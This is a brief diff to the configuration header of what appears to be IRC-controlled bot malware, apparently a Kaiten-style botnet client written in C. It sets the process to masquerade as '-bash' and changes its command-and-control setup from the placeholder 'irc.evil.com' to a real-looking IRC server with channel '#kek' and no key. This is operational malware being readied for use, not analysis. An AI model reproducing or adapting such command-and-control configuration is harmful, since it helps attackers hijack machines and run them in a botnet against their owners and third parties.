@@ -70,11 +70,11 @@
 #undef STARTUP			// Start on startup?
 #undef IDENT			// Only enable this if you absolutely have to
 #define FAKENAME "-bash"	// What you want this to hide as
-#define CHAN "#shellol"		// Channel to join
-#define KEY "bleh"		// The key of the channel
+#define CHAN "#kek"		// Channel to join
+#define KEY ""		// The key of the channel
 int numservers=1;		// Must change this to equal number of servers down there
 char *servers[] = {		// List the servers in that format, always end in (void*)0
-        "irc.evil.com",
+        "irc.kekthepla.net",
         (void*)0
 };
 ////////////////////////////////////////////////////////////////////////////////
